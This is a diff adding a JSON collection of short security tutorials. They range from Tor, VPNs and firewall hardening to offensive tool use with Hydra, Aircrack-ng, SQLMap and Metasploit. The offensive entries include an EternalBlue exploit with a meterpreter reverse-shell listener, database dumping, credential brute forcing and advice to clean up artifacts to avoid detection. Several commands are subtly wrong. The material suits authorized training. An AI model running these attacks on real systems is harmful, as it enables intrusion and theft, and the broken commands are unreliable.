@@ -1,0 +1,472 @@
+{
+    "tutorials": [
+        {
+            "name": "Using Tor Browser for Anonymous Browsing",
+            "category": "Anonymity & Privacy",
+            "description": "How to install, configure, and safely use Tor Browser to protect your identity online.",
+            "steps": [
+                "Download Tor Browser from the official Tor Project website.",
+                "Verify the download's GPG signature to ensure authenticity.",
+                "Install and launch the browser.",
+                "Avoid logging into personal accounts to preserve anonymity.",
+                "Use HTTPS sites whenever possible.",
+                "Never enable browser plugins like Flash or JavaScript without understanding risks.",
+                "Understand Tor’s limitations and how adversaries may de-anonymize users.",
+                "Regularly update the Tor Browser for security patches."
+            ],
+            "notes": "Use Tor for sensitive browsing and avoid habits that can link your real identity.",
+            "links": [
+                "https://tb-manual.torproject.org/"
+            ]
+        },
+        {
+            "name": "Setting Up a Personal VPN Server",
+            "category": "Privacy & Security",
+            "description": "Deploy your own VPN server to secure and anonymize your internet traffic.",
+            "steps": [
+                "Select a VPS provider that respects privacy (e.g., DigitalOcean, Vultr).",
+                "Deploy a clean Ubuntu or Debian server instance.",
+                "Install AlgoVPN or OpenVPN using automated scripts.",
+                "Configure firewall rules to restrict traffic as needed.",
+                "Generate client configuration files for your devices.",
+                "Install and configure VPN clients on your devices (Windows, macOS, Linux, Android, iOS).",
+                "Test the VPN connection and verify IP address and DNS leak protection.",
+                "Maintain and update your VPN server regularly."
+            ],
+            "notes": "Running your own VPN gives control but requires maintenance and technical skills.",
+            "links": [
+                "https://github.com/trailofbits/algo",
+                "https://openvpn.net/"
+            ]
+        },
+        {
+            "name": "Basic Password Cracking with John the Ripper",
+            "category": "Password Cracking",
+            "description": "Learn to crack password hashes ethically using John the Ripper in a lab environment.",
+            "steps": [
+                "Collect password hashes from your own test environment or authorized penetration test.",
+                "Choose an appropriate wordlist, such as the RockYou list.",
+                "Run john with your hash file and wordlist: john --wordlist=rockyou.txt hashes.txt",
+                "Monitor progress and use additional modes like incremental or rules for improved cracking.",
+                "Analyze cracked passwords and improve your attack strategies.",
+                "Always respect laws and ethics—never crack passwords without permission."
+            ],
+            "notes": "Understand different hash algorithms (MD5, NTLM, bcrypt) for effective cracking.",
+            "links": [
+                "https://www.openwall.com/john/"
+            ]
+        },
+        {
+            "name": "Reconnaissance with Nmap",
+            "category": "Information Gathering",
+            "description": "Perform network discovery and port scanning using Nmap.",
+            "steps": [
+                "Identify your target's IP address or domain.",
+                "Perform a basic ping scan: nmap -sn target.com",
+                "Run a TCP SYN scan on common ports: nmap -sS -p 1-1024 target.com",
+                "Use service version detection: nmap -sV target.com",
+                "Perform OS detection: nmap -O target.com",
+                "Save results to file: nmap -oN scan_results.txt target.com",
+                "Analyze open ports and services to plan further testing."
+            ],
+            "notes": "Always have permission before scanning to avoid legal issues.",
+            "links": [
+                "https://nmap.org/book/man.html"
+            ]
+        },
+        {
+            "name": "Using Metasploit for Exploitation",
+            "category": "Exploitation Framework",
+            "description": "Basics of using Metasploit Framework to exploit vulnerabilities.",
+            "steps": [
+                "Start msfconsole by typing msfconsole in your terminal.",
+                "Search for exploits using keywords: search smb",
+                "Select an exploit: use exploit/windows/smb/ms17_010_eternalblue",
+                "Set target options: set RHOST 192.168.1.105",
+                "Set payload: set payload windows/meterpreter/reverse_tcp",
+                "Configure your listener IP: set LHOST 192.168.1.100",
+                "Run the exploit with exploit or run command.",
+                "Interact with the session to control the target machine."
+            ],
+            "notes": "Use only in controlled and authorized environments.",
+            "links": [
+                "https://metasploit.help.rapid7.com/docs"
+            ]
+        },
+        {
+            "name": "Wi-Fi Cracking with Aircrack-ng",
+            "category": "Wireless Attacks",
+            "description": "Use Aircrack-ng suite to capture and crack Wi-Fi passwords.",
+            "steps": [
+                "Put your wireless card into monitor mode: airmon-ng start wlan0",
+                "Capture packets with airodump-ng: airodump-ng wlan0mon",
+                "Target a specific AP and capture handshake.",
+                "Use aircrack-ng to crack handshake using a wordlist: aircrack-ng -w rockyou.txt capture.cap",
+                "Analyze the results to see if password cracked."
+            ],
+            "notes": "Requires compatible wireless card and understanding of wireless security.",
+            "links": [
+                "https://www.aircrack-ng.org/"
+            ]
+        },
+        {
+            "name": "Configuring Firewalls with iptables",
+            "category": "Network Security",
+            "description": "Secure your Linux system using iptables for packet filtering and NAT.",
+            "steps": [
+                "Install iptables: sudo apt install iptables",
+                "Flush existing rules: sudo iptables -F",
+                "Set default policies: sudo iptables -P INPUT DROP; sudo iptables -P FORWARD DROP; sudo iptables -P OUTPUT ACCEPT",
+                "Allow SSH access: sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
+                "Allow HTTP/HTTPS: sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT; sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
+                "Enable masquerading for NAT: sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
+                "Save rules to persist on reboot: sudo sh -c 'iptables-save > /etc/iptables/rules.v4'",
+                "Monitor firewall logs with journalctl or syslog."
+            ],
+            "notes": "Always test rules in a non-production environment before deploying.",
+            "links": [
+                "https://wiki.archlinux.org/title/Iptables"
+            ]
+        },
+        {
+            "name": "Setting Up a Honeypot with Dionaea",
+            "category": "Network Security",
+            "description": "Deploy a honeypot to monitor attacker behavior and gather intelligence.",
+            "steps": [
+                "Install Dionaea on a Linux server: sudo apt install dionaea",
+                "Configure the honeypot to simulate vulnerable services (e.g., SMB, FTP).",
+                "Set up logging to capture attacker interactions: edit /etc/dionaea.conf.",
+                "Start the honeypot service: systemctl start dionaea",
+                "Monitor logs with tail -f /var/log/dionaea.log",
+                "Analyze traffic using Wireshark or tcpdump for patterns.",
+                "Secure the honeypot to prevent resource exhaustion attacks.",
+                "Integrate with SIEM tools like ELK Stack for advanced monitoring."
+            ],
+            "notes": "Honeypots are legal but should be isolated from critical systems.",
+            "links": [
+                "https://www.dionaea.org/"
+            ]
+        },
+        {
+            "name": "Securing SSH with Key-Based Authentication",
+            "category": "Network Security",
+            "description": "Replace password-based SSH access with cryptographic keys for better security.",
+            "steps": [
+                "Generate a key pair: ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"",
+                "Copy the public key to the server: ssh-copy-id user@server",
+                "Disable password login in /etc/ssh/sshd_config: PermitRootLogin no; PasswordAuthentication no",
+                "Restart SSH service: systemctl restart ssh",
+                "Use agent forwarding for secure key management.",
+                "Enable strict mode: UsePrivilegeSeparation yes; IgnoreRhosts yes",
+                "Audit logs for failed attempts: tail -f /var/log/auth.log",
+                "Rotate keys regularly and revoke compromised ones."
+            ],
+            "notes": "Avoid storing private keys on untrusted devices.",
+            "links": [
+                "https://www.ssh.com/ssh/key-based-auth/"
+            ]
+        },
+        {
+            "name": "Cracking Passwords with Hashcat",
+            "category": "Password Cracking",
+            "description": "Use Hashcat to crack modern password hashes using GPU acceleration.",
+            "steps": [
+                "Install Hashcat: sudo apt install hashcat",
+                "Convert hashes to the correct format for Hashcat: john --format=raw-md5 hashes.txt > hashfile.hash",
+                "Run a wordlist attack: hashcat -a 0 -m 0 hashfile.hash rockyou.txt",
+                "Use mask attacks for pattern-based passwords: hashcat -a 3 -m 0 hashfile.hash ?d?d?d?d?d?d",
+                "Enable GPU acceleration with the --gpu option.",
+                "Monitor progress and adjust rules or masks as needed.",
+                "Export results to a file: hashcat -o cracked_hashes.txt hashfile.hash rockyou.txt",
+                "Respect ethical guidelines and never crack unauthorized passwords."
+            ],
+            "notes": "Support for newer hashes like bcrypt, SHA-256, etc., requires specific modes.",
+            "links": [
+                "https://hashcat.net/hashcat/"
+            ]
+        },
+        {
+            "name": "Port Scanning with Nmap (Advanced)",
+            "category": "Information Gathering",
+            "description": "Perform in-depth port scans and service enumeration using advanced Nmap options.",
+            "steps": [
+                "Scan all ports: nmap -sS target.com",
+                "Use OS detection: nmap -O target.com",
+                "Check for vulnerabilities with scripting engine: nmap --script vuln target.com",
+                "Perform a SYN scan without completing the three-way handshake: nmap -sS -p 1-65535 target.com",
+                "Scan UDP ports: nmap -sU -p 53,80,443 target.com",
+                "Use aggressive OS detection: nmap -O --osscan-limit target.com",
+                "Save output in XML format for analysis: nmap -oX scan.xml target.com",
+                "Combine results with other tools like Nmap Scripting Engine (NSE)."
+            ],
+            "notes": "Ensure you have explicit permission before scanning live networks.",
+            "links": [
+                "https://nmap.org/book/man-banners.html"
+            ]
+        },
+        {
+            "name": "Exploiting Vulnerabilities with Metasploit",
+            "category": "Exploitation Framework",
+            "description": "Explore advanced exploitation techniques using the Metasploit Framework.",
+            "steps": [
+                "Update the Metasploit database: msfupdate",
+                "Search for exploits: search exploit/windows/smb",
+                "Use an exploit module: use exploit/windows/smb/ms17_010_eternalblue",
+                "Set payload options: set RHOSTS target_ip; set PAYLOAD windows/meterpreter/reverse_tcp",
+                "Start a listener: msfconsole -x \"use multi/handler; set LHOST your_ip; set LPORT 4444; exploit\"",
+                "Interact with the session: sessions -i 1",
+                "Use Meterpreter to manipulate files and execute commands.",
+                "Clean up artifacts to avoid detection."
+            ],
+            "notes": "Always operate in legal and authorized environments.",
+            "links": [
+                "https://www.rapid7.com/products/metasploit/"
+            ]
+        },
+        {
+            "name": "Wireless Network Analysis with Wireshark",
+            "category": "Wireless Attacks",
+            "description": "Analyze wireless traffic using Wireshark to detect vulnerabilities or malicious activity.",
+            "steps": [
+                "Install Wireshark: sudo apt install wireshark",
+                "Start a capture on the wireless interface: tshark -i wlan0",
+                "Filter for specific protocols (e.g., HTTP, DNS): tcp.port == 80",
+                "Analyze packet details to identify unauthorized access attempts.",
+                "Monitor for rogue APs and malformed packets.",
+                "Use Wireshark's decryption features with pre-shared keys for Wi-Fi traffic.",
+                "Save captures in .pcap format for later analysis.",
+                "Compare baseline traffic against real-time data for anomalies."
+            ],
+            "notes": "Requires capturing on the correct wireless interface.",
+            "links": [
+                "https://www.wireshark.org/docs/manpage.html"
+            ]
+        },
+        {
+            "name": "Testing DNSSEC with nslookup and dig",
+            "category": "Network Security",
+            "description": "Verify DNSSEC integrity using command-line tools like nslookup and dig.",
+            "steps": [
+                "Check DNSSEC validation: dig +dnssec example.com",
+                "Verify if records are signed: dig @dnssec.example.com example.com +dnssec",
+                "Test for spoofing vulnerabilities: dig example.com AAAA",
+                "Use nslookup to resolve domains and check DNSSEC status.",
+                "Analyze DNS response flags (e.g., AD bit) for validation confirmation.",
+                "Monitor for invalid DNS records or unexpected TTL values.",
+                "Integrate with public DNS resolvers like Google Public DNS.",
+                "Ensure your resolver supports DNSSEC validation."
+            ],
+            "notes": "DNSSEC requires proper configuration and trust chains.",
+            "links": [
+                "https://tools.ietf.org/html/rfc4638"
+            ]
+        },
+        {
+            "name": "Using Kali Linux for Ethical Hacking",
+            "category": "Penetration Testing",
+            "description": "Learn to use Kali Linux as a penetration testing platform with pre-installed security tools.",
+            "steps": [
+                "Download and install Kali Linux from the official site.",
+                "Boot into live mode or install on a virtual machine.",
+                "Access the terminal for command-line tools like Nmap, Metasploit, and Wireshark.",
+                "Use the Kali menu to launch tools: kali-menu",
+                "Perform network scanning with built-in scripts.",
+                "Test web applications using tools like DirBuster or SqlMap.",
+                "Analyze logs and forensic data with tools like Autopsy.",
+                "Keep your system updated with apt upgrade."
+            ],
+            "notes": "Kali Linux is designed for authorized security testing only.",
+            "links": [
+                "https://www.kali.org/"
+            ]
+        },
+        {
+            "name": "Exploiting Web Applications with SQLMap",
+            "category": "Web Application Security",
+            "description": "Automate SQL injection attacks and exploit vulnerabilities in web applications.",
+            "steps": [
+                "Install SQLMap: git clone https://github.com/sqlmapproject/sqlmap.git",
+                "Run a basic scan: sqlmap -u \"http://target.com/page.php?id=1\"",
+                "Specify the type of SQL injection: sqlmap -u \"http://target.com/page.php?id=1\" --technique=GET",
+                "Test for different databases: sqlmap -u \"http://target.com/page.php?id=1\" --dbms=mysql",
+                "Attempt to dump tables: sqlmap -u \"http://target.com/page.php?id=1\" --dump",
+                "Use payloads for blind SQL injection: sqlmap -u \"http://target.com/page.php?id=1\" --payload=\"SELECT 1 FROM users--\"",
+                "Check for vulnerabilities in forms and POST requests.",
+                "Always have authorization to test web applications."
+            ],
+            "notes": "SQLMap supports various types of injections and databases.",
+            "links": [
+                "https://github.com/sqlmapproject/sqlmap"
+            ]
+        },
+        {
+            "name": "Wireless Network Hacking with Kismet",
+            "category": "Wireless Attacks",
+            "description": "Use Kismet to detect rogue access points and analyze wireless network traffic.",
+            "steps": [
+                "Install Kismet: sudo apt install kismet",
+                "Configure your wireless card for monitoring mode.",
+                "Start Kismet: kismet",
+                "Scan for nearby networks using the default channels.",
+                "Detect and analyze rogue APs (rogue access points).",
+                "Capture packets to analyze traffic in real-time.",
+                "Use filters to focus on specific SSIDs or channels.",
+                "Save captures for later analysis with Wireshark."
+            ],
+            "notes": "Kismet requires a compatible wireless card and proper configuration.",
+            "links": [
+                "https://www.kismetwireless.net/"
+            ]
+        },
+        {
+            "name": "Penetration Testing with Burp Suite",
+            "category": "Web Application Security",
+            "description": "Use Burp Suite to intercept and modify HTTP requests for web application testing.",
+            "steps": [
+                "Install Burp Suite (Professional or Community version).",
+                "Set up the proxy in your browser: Proxy -> Options -> Listeners -> Add a new listener.",
+                "Intercept traffic by enabling 'Intercept' mode.",
+                "Modify request parameters to test for vulnerabilities like XSS and CSRF.",
+                "Use the scanner tool to automatically detect web application issues.",
+                "Test forms and inputs for SQL injection or command injection.",
+                "Analyze responses for unexpected behavior or errors.",
+                "Document findings and report them securely."
+            ],
+            "notes": "Burp Suite is ideal for testing web applications in a lab environment.",
+            "links": [
+                "https://portswigger.net/burp"
+            ]
+        },
+        {
+            "name": "Using Hydra for Brute Force Attacks",
+            "category": "Password Cracking",
+            "description": "Perform brute force attacks on network services using Hydra to guess credentials.",
+            "steps": [
+                "Install Hydra: sudo apt install hydra",
+                "Run a basic attack on SSH: hydra -s 22 target.com ssh",
+                "Test against FTP, HTTP Basic Auth, or other protocols: hydra -t 50 -l admin -p password ftp://target.com",
+                "Use wordlists for efficient credential guessing: hydra -L users.txt -P passwords.txt http-get /login",
+                "Monitor the attack progress and adjust settings.",
+                "Stop attacks if they become too slow or resource-intensive.",
+                "Respect legal limits and never attack unauthorized services."
+            ],
+            "notes": "Hydra is effective against weak credentials but may be slow for complex passwords.",
+            "links": [
+                "https://www.thc.org/thc-hydra/"
+            ]
+        },
+        {
+            "name": "Monitoring Network Traffic with Tcpdump",
+            "category": "Network Analysis",
+            "description": "Capture and analyze network traffic using the command-line tool tcpdump for forensic analysis.",
+            "steps": [
+                "Install Tcpdump: sudo apt install tcpdump",
+                "Start a packet capture on a specific interface: tcpdump -i eth0",
+                "Filter traffic by port, IP address, or protocol (e.g., http): tcpdump port 80",
+                "Save captured packets to a file: tcpdump -w capture.pcap",
+                "Analyze the file later with Wireshark or tshark.",
+                "Use display filters to find specific packets in the capture.",
+                "Monitor for suspicious traffic patterns or unauthorized connections.",
+                "Capture only necessary data to avoid storage issues."
+            ],
+            "notes": "Tcpdump is a powerful tool but requires careful use for compliance and performance.",
+            "links": [
+                "https://www.tcpdump.org/manpages/tcpdump.8.html"
+            ]
+        },
+        {
+            "name": "Wireless Network Sniffing with Wireshark",
+            "category": "Wireless Attacks",
+            "description": "Capture and analyze wireless network packets using Wireshark for security analysis.",
+            "steps": [
+                "Install Wireshark: sudo apt install wireshark",
+                "Start capturing on the correct wireless interface (e.g., wlan0).",
+                "Use filters to isolate traffic of interest, such as HTTP or DNS requests.",
+                "Analyze packet contents for sensitive data like passwords or session cookies.",
+                "Monitor for repeated packets or malformed frames that may indicate a replay attack.",
+                "Compare captured packets against expected patterns to identify anomalies.",
+                "Export relevant captures for further forensic analysis.",
+                "Ensure your capture does not violate network policies."
+            ],
+            "notes": "Wireshark can only capture traffic on the same subnet if it's in promiscuous mode.",
+            "links": [
+                "https://www.wireshark.org/docs/manpage.html"
+            ]
+        },
+        {
+            "name": "Using Nmap for Vulnerability Scanning",
+            "category": "Information Gathering",
+            "description": "Identify potential vulnerabilities using Nmap’s script scanning capabilities.",
+            "steps": [
+                "Run a vulnerability scan: nmap --script vuln target.com",
+                "Check specific types of vulnerabilities, such as those in the SSL/TLS stack: nmap --script ssl-enum-ciphers target.com",
+                "Use scripts to detect outdated software or services: nmap --script http-server-header target.com",
+                "Scan for misconfigurations: nmap --script http-title target.com",
+                "Analyze results to prioritize remediation efforts.",
+                "Combine with other tools like Nessus for a comprehensive assessment.",
+                "Ensure you have permission before running scans on live systems.",
+                "Regularly update Nmap scripts for the latest security checks."
+            ],
+            "notes": "Nmap’s vulnerability scanning is a starting point, not a substitute for full penetration testing.",
+            "links": [
+                "https://nmap.org/nsedoc/"
+            ]
+        },
+        {
+            "name": "Password Cracking with Hashcat",
+            "category": "Password Cracking",
+            "description": "Use Hashcat to perform high-speed password cracking using various algorithms and hardware acceleration.",
+            "steps": [
+                    "Install Hashcat on your system (Windows, Linux, macOS).",
+                    "Acquire the hash file you want to crack.",
+                    "Choose an appropriate wordlist or attack mode (e.g., dictionary, brute force, hybrid).",
+                    "Run a basic attack with a wordlist: hashcat -a 0 -w 3 hashes.txt rockyou.txt",
+                    "Use GPU acceleration for faster cracking: hashcat -a 0 -w 3 -m 0 hashes.txt rockyou.txt",
+                    "Monitor progress and adjust the workload (e.g., -w parameter).",
+                    "Consider using rules or masks to enhance efficiency.",
+                    "Analyze cracked passwords and improve your attack strategies."
+                ],
+            "notes": "Hashcat is a powerful tool that requires understanding of hash types and cracking methods.",
+            "links": [
+                "https://hashcat.net/"
+            ]
+        },
+        {
+            "name": "Using Wireshark for Packet Analysis",
+            "category": "Network Analysis",
+            "description": "Analyze captured network traffic using Wireshark to identify patterns, vulnerabilities, or malicious activity.",
+            "steps": [
+                    "Install Wireshark on your system (Windows, Linux, macOS).",
+                    "Start a packet capture on the desired interface (e.g., eth0).",
+                    "Apply filters based on protocol (HTTP, DNS, etc.) or source/destination IP addresses.",
+                    "Examine individual packets for anomalies like unexpected data payloads or malformed headers.",
+                    "Use display filters to narrow down the captured data for analysis.",
+                    "Save relevant captures for later review.",
+                    "Identify and document patterns of suspicious behavior.",
+                    "Review traffic for signs of intrusion attempts, malware activity, or network misconfigurations."
+                ],
+            "notes": "Wireshark is useful for understanding network behavior but requires expertise to interpret results effectively.",
+            "links": [
+                "https://www.wireshark.org"
+            ]
+        },
+        {
+            "name": "Wireless Network Hacking with Kismet",
+            "category": "Wireless Attacks",
+            "description": "Detect rogue access points and analyze wireless network traffic using Kismet.",
+            "steps": [
+                    "Install Kismet on your system (Windows, Linux, macOS).",
+                    "Configure a compatible wireless card for monitoring mode.",
+                    "Run Kismet to scan the surrounding networks: kismet",
+                    "Identify potential rogue APs by their unique SSIDs or unusual characteristics.",
+                    "Use filters to focus on specific channels or types of traffic.",
+                    "Capture packets for deeper analysis.",
+                    "Export results for further investigation with other tools like Wireshark."
+                ],
+            "notes": "Kismet is effective in detecting unauthorized wireless networks but requires a properly configured hardware setup.",
+            "links": [
+                "https://www.kismetwireless.net/"
+            ]
+        }
+    ]
+}
